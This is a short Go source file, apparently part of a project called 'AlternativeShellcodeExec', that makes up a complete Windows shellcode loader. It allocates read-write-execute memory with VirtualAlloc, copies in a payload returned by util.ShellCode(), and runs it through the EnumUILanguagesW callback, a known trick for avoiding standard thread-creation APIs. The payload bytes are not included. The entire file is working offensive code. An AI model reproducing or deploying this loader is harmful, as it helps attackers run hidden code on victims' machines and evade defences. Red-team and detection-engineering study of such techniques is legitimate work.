package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// Use EnumUILanguagesW to call the shellcode
	enumUILanguagesW, _ := kernel32.FindProc("EnumUILanguagesW")
	ret, _, err := enumUILanguagesW.Call(addr, 0x00, 0) // Use 0x2 for MUI_LANGUAGE_ID
	if err != nil {
		fmt.Println("Error EnumUILanguagesW", err)
		return
	}
	if ret == 0 {
		println("EnumUILanguagesW failed:", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
